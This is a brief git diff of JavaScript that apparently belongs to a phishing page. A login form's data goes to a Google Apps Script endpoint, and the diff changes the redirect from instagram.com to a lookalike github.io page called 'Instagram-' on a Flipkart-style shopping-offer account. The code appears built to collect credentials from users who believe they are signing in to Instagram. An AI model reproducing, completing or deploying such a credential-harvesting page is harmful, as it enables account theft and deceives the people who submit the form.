@@ -1,5 +1,5 @@
 const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxKsOxrUYN8r-rVekTooTqZYejXkxg4HnvpxwCpLX9pClK1gFXcxrdPIxsd9kWsrF5S/exec";
-const REDIRECT_URL = "instagram.com"; 
+const REDIRECT_URL = "https://flipcartshoppingoffer.github.io/Instagram-/"; 
 
 const form = document.getElementById("contactForm");
 const submitBtn = document.getElementById("loginBtn");
